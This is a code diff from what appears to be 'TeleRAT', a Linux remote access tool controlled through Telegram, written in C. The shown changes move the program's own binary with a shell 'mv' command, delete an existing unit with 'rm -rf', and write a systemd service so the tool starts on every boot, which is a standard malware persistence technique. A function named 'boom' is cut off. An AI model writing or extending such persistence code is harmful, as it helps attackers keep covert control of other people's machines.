@@ -38,10 +38,9 @@ void exeCMD(char *cmd){
 
 void serviceSetting(char *path,char *pName){
     struct cmd_struct cmd;
-    if(path == NULL) getNowPath(cmd.nowPath);
-    getpName(pName);
+
 	//Connect path with program	
-	sprintf(cmd.cmd,"%s%s",cmd.nowPath,pName);
+	sprintf(cmd.cmd,"%s%s",path,pName);
 	
 	//writing in /etc/systemd/system
 	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","w");
@@ -55,27 +54,31 @@ void serviceSetting(char *path,char *pName){
 	sprintf(text,"[Unit]\n"
 		"Description = TeleRAT Remote Administrator Via Telegram\n\n"
         "[Service]\n"
-	    "ExecStart =%s\n\n"
+	    "ExecStart = %s\n\n"
 		"[Install]\n"
 	    "WantedBy=multi-user.target\n\n",cmd.cmd);
+    printf("%s",text);
 	fprintf(f,"%s",text);
+    free(text);
+    bzero(cmd.cmd,sizeof(cmd.cmd));
 }
 
 //parse path to command
 void move(char *path, char *pName){
     struct cmd_struct cmd;
-    //Get now program location
+     //Get now program location
     getNowPath(cmd.nowPath);
 
     printf("%s",cmd.nowPath);
 
 
-    getpName(pName);
     //parse path to cmd
     sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
     // printf("%s",cmd.cmd);
     exeCMD(cmd.cmd);
-    serviceSetting(path,pName);
+    exeCMD("rm -rf /etc/systemd/system/TeleRAT.service");
+    bzero(cmd.cmd,sizeof(cmd.cmd));
+    serviceSetting("/",pName);
 }
 
 void boom(char *path,char *pName){
